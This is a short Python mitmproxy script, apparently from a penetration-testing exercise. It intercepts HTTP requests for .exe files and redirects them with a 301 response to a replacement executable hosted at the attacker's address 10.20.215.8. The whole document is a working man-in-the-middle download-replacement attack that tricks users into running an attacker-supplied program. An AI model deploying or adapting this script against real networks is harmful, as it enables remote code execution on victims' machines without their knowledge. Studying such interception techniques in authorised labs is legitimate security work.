from mitmproxy import http


def request(flow):

    if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".exe"):
        print("[+] Got an interesting flow.")
        flow.response = http.HTTPResponse.make(301,  "", {"Location": "http://10.20.215.8/file.exe"})
